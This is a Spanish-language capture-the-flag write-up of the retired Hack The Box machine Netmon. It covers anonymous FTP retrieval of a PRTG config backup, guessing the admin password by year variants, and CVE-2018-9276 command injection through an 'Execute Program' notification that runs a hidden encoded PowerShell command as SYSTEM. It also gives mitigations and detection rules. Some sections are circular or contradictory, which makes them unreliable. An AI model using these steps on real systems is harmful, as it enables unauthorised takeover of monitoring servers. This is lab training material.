---
machine: Netmon
os: Windows
difficulty: Easy
platform: Hack The Box
category: Servicios / Windows
state: Retired
pwned: 2026-11-09
tags: [windows, prtg, ftp, cve-2018-9276, command-injection]
---

# Netmon — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

FTP anónimo con una copia de la configuración de **PRTG** que trae la contraseña del panel. Con ella se entra en PRTG y se abusa de **CVE-2018-9276**: una notificación de tipo *Execute Program* ejecuta comandos como `SYSTEM`.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 21,80,135,139,445,5985,8080,47001 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 21/tcp | FTP anónimo |
| 80/tcp | IIS (redirect) |
| 8080/tcp | PRTG Network Monitor |
| 445/tcp | SMB |

## Enumeración

```bash
ftp <TARGET_IP>          # anonymous / anonymous
ls -la
get "PRTG Configuration.old.bak"
```

En el backup aparece `prtgadmin` con una contraseña antigua. PRTG suele conservar el patrón y cambiar solo el año (`...2018` → `...2019`).

```bash
curl -s -u 'prtgadmin:<password>' http://<TARGET_IP>:8080/api/table.json?content=sensors
```

## Foothold

Panel → **Setup → Account Settings → Notifications → Add new notification**:

- Tipo: *Execute Program*
- Programa: `cmd.exe`
- Parámetros: `/c powershell -nop -w hidden -enc <BASE64>`

Al guardar y lanzar la notificación, el comando se ejecuta como la cuenta del servicio PRTG (`SYSTEM`).

```powershell
whoami
type C:\Users\Public\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **FTP anónimo cerrado** → prueba `anonymous:anonymous` y `ftp:ftp`; en algunas instancias el share es de solo lectura pero suficiente.
- **Login de PRTG rechazado** → la contraseña del backup es antigua; prueba variantes de año y mayúsculas.
- **La notificación no ejecuta** → hay que **guardarla** y luego dispararla desde la lista; el campo de parámetros no admite comillas simples.
- **`whoami` falla** → el servicio PRTG no corre como SYSTEM en esa build; comprueba el proceso con `tasklist`.

## Mitigaciones y detección

- **4688** con `cmd.exe`/`powershell.exe` hijo de `PRTG Core Server.exe`.
- PRTG: cambiar credenciales por defecto, restringir el panel y aplicar la versión corregida de CVE-2018-9276.
- No guardar backups de configuración en FTP accesible; cifrarlos y rotarlos.
- Alertar de notificaciones nuevas con *Execute Program* y de descargas anónimas por FTP.

MITRE: T1078, T1059.001, T1190.

## Referencias

- [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)
- [MITRE T1059.001](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1078](https://attack.mitre.org/techniques/T1078/)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
- [rop-stack](../../../knowledge/pwn/rop-stack.md)
